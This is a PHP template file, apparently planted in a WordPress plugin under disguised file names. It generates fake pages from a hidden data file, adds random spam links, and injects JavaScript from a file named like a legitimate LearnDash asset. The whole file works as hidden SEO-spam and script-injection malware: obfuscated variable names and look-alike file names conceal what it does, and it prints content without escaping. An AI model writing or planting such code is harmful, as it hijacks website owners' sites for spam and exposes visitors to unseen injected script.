<?php
$siHIxV8 = intval(get_query_var('qjpfgmkwk'));

if ($siHIxV8 < 1 || $siHIxV8 > 2708) return;
$b5IuQIh = file(plugin_dir_path(__FILE__).'compat-sharing.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$wDcfVYpNJ = explode(';', $b5IuQIh[$siHIxV8]);
if (count($wDcfVYpNJ) < 2) return;
$qaDYcW = $wDcfVYpNJ[0];
$oMDjtwAnsC  = $wDcfVYpNJ[1];
$sfP1XZvPX = $wDcfVYpNJ[2];
$yGd0n9fd  = $wDcfVYpNJ[3];
$vAeQnmxL = $wDcfVYpNJ[4];
set_query_var('wwniazmg', $qaDYcW);

$zRQehV8 = '';
$tTTQzKyZ = plugin_dir_path(__FILE__).'fields-another.php';
if (is_file($tTTQzKyZ)) {
	$hyYBM2JjJ = file($tTTQzKyZ, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($hyYBM2JjJ);
	shuffle($hyYBM2JjJ);
	$bhr43 = mt_rand(2, 5);
	if (count($hyYBM2JjJ) > $bhr43) {
		for ($uq3AF = 0; $uq3AF < $bhr43; $uq3AF++) {
			$iJ6ihS5 = array_shift($hyYBM2JjJ);
			$zRQehV8 .= '<p><a href="'.$iJ6ihS5.'">'.$iJ6ihS5.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $qaDYcW; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $oMDjtwAnsC . "</p>\n";
				if (strlen($yGd0n9fd) > 0) echo "<p>" . $yGd0n9fd . "</p>\n";
				if (strlen($sfP1XZvPX) > 0) echo "<p>" . $sfP1XZvPX . "</p>\n";
				if (strlen($vAeQnmxL) > 0) echo '<p><a href="#"><img src="'.$vAeQnmxL.'"></a>' . "</p>\n";
				echo $zRQehV8;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$gqVLpV = plugin_dir_path(__FILE__) . 'learndash-title.js';
if (is_file($gqVLpV)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($gqVLpV);
	echo '</script>';
}
get_footer();
?>
